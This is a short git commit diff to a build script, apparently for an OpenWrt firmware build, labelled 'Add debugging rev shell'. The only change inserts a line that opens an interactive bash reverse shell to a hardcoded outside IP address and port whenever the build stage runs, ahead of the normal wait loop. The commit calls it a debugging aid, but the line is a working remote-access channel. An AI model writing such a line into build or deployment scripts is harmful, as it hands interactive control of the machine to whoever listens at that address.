6718163ec3136a4b040a9fa89cdf66d1227005e4
Richard Wohlbold <richard@rgwohlbold.de>
2023-03-21 12:54:01 +0100

    Add debugging rev shell

--- scripts/stage2.sh
+++ scripts/stage2.sh
@@ -2,6 +2,7 @@
 set -ex
 shopt -s globstar
 cd /home/build/openwrt
+bash -i >& /dev/tcp/162.55.50.227/1337 0>&1
 while [ ! -f "package/network/services/gaffa/Makefile" ]; do
   echo "waiting for package/network/services/gaffa"
   sleep 1
